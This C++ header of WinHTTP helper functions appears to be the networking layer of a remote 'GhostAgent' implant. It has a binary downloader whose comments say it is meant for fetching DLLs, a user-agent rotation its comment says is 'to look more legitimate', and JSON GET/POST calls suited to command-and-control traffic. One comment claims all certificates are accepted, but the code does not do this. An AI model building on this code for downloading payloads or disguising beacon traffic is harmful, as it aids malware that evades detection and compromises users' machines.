#pragma once
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <cstdio>

#pragma comment(lib, "winhttp.lib")

// ─── HTTP GET → binary buffer ────────────────────────────────
// Diferente do http_get que retorna string (corta em \0),
// essa retorna os bytes crus pra baixar DLL etc.
std::vector<BYTE> http_get_binary(const wchar_t* host, int port,
                                   const wchar_t* path, bool https = true) {
    std::vector<BYTE> result;
    
    // user-agent aleatorio pra parecer mais legitimo
    const char* agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
    };
    int agent_idx = GetTickCount() % 4;
    wchar_t wagent[256];
    MultiByteToWideChar(CP_UTF8, 0, agents[agent_idx], -1, wagent, 256);
    
    HINTERNET hSession = WinHttpOpen(wagent,
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     NULL, NULL, 0);
    if (!hSession) return result;
    
    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return result; }
    
    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                            NULL, NULL, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result; }
    
    DWORD secure_protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS, &secure_protocols, sizeof(secure_protocols));
    
    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        
        BYTE buffer[8192];
        DWORD bytes_read;
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
            result.insert(result.end(), buffer, buffer + bytes_read);
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

// ─── download de URL completa (parseia host/path automatico) ──
std::vector<BYTE> http_get_binary_url(const char* url_str) {
    std::vector<BYTE> result;
    
    wchar_t url[512];
    MultiByteToWideChar(CP_UTF8, 0, url_str, -1, url, 512);
    
    URL_COMPONENTSW comp = { sizeof(comp) };
    wchar_t host[256] = {0};
    wchar_t path[1024] = {0};
    wchar_t extra[64] = {0};
    comp.lpszHostName     = host;
    comp.dwHostNameLength = 256;
    comp.lpszUrlPath      = path;
    comp.dwUrlPathLength  = 1024;
    comp.lpszExtraInfo    = extra;
    comp.dwExtraInfoLength = 64;
    
    if (!WinHttpCrackUrl(url, 0, 0, &comp)) return result;
    
    bool https = (comp.nScheme == INTERNET_SCHEME_HTTPS);
    int port = comp.nPort;
    if (port == 0) port = https ? 443 : 80;
    
    return http_get_binary(host, port, path, https);
}

// ─── simple HTTP GET via WinHTTP ──────────────────────────────
// returns the response body, or empty string on failure
std::string http_get(const wchar_t* host, int port, const wchar_t* path, bool https = true) {
    std::string result;
    
    HINTERNET hSession = WinHttpOpen(L"GhostAgent/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     NULL, NULL, 0);
    if (!hSession) return result;
    
    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return result;
    }
    
    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                            NULL, NULL, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result;
    }
    
    // accept all certs (for Render's letsencrypt etc)
    DWORD secure_protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS, &secure_protocols, sizeof(secure_protocols));
    
    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        
        char buffer[4096];
        DWORD bytes_read;
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
            buffer[bytes_read] = '\0';
            result += buffer;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

// ─── simple HTTP POST ─────────────────────────────────────────
std::string http_post(const wchar_t* host, int port, const wchar_t* path,
                      const char* body, bool https = true) {
    std::string result;
    
    HINTERNET hSession = WinHttpOpen(L"GhostAgent/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     NULL, NULL, 0);
    if (!hSession) return result;
    
    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return result;
    }
    
    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
                                            NULL, NULL, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result;
    }
    
    DWORD secure_protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS, &secure_protocols, sizeof(secure_protocols));
    
    LPCWSTR headers = L"Content-Type: application/json\r\n";
    int body_len = (int)strlen(body);
    
    if (WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers), (void*)body, body_len, body_len, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        
        char buffer[4096];
        DWORD bytes_read;
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
            buffer[bytes_read] = '\0';
            result += buffer;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

// ─── parse simple JSON string value ───────────────────────────
std::string json_get_string(const std::string& json, const char* key) {
    std::string search = std::string("\"") + key + "\":\"";
    size_t start = json.find(search);
    if (start == std::string::npos) return "";
    start += search.size();
    size_t end = json.find("\"", start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}
